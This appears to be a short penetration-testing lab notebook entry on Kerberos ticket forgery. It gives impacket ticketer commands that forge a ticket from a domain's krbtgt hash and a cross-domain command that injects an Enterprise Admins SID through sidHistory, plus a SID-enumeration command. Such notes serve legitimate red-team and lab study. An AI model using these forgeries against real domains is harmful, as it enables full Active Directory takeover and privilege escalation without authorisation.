## Generate a lab ticket from known domain key material

**Run in:** Kali. **Requires:** Correct lab key material, domain SID and principal assumptions; ticket acceptance depends on the target's current Kerberos/PAC policy.

```bash
impacket-ticketer -nthash KRBTGT_NT_HASH -domain-sid DOMAIN_SID -domain DOMAIN_FQDN LAB_USER
```

**What the result establishes:** Inspect the ticket principal, realm, service, lifetime and encryption context before selecting it in a client.

**Next check:** Inspect realm, principal, lifetime, encryption and key correctness; generation alone is not evidence of successful authentication.

## Cross-domain / cross-forest

**Notebook example**

```bash
# child -> parent: forge an inter-realm TGT with the child krbtgt + SID history (sidHistory of Enterprise Admins)
ticketer.py -nthash <krbtgt_hash> -domain-sid <child_sid> -extra-sid <root_sid>-519 -domain child.corp.local Administrator
# intra-forest trust key abuse
lookupsid.py $DOMAIN/USER:PASS@$DC       # get SIDs
```
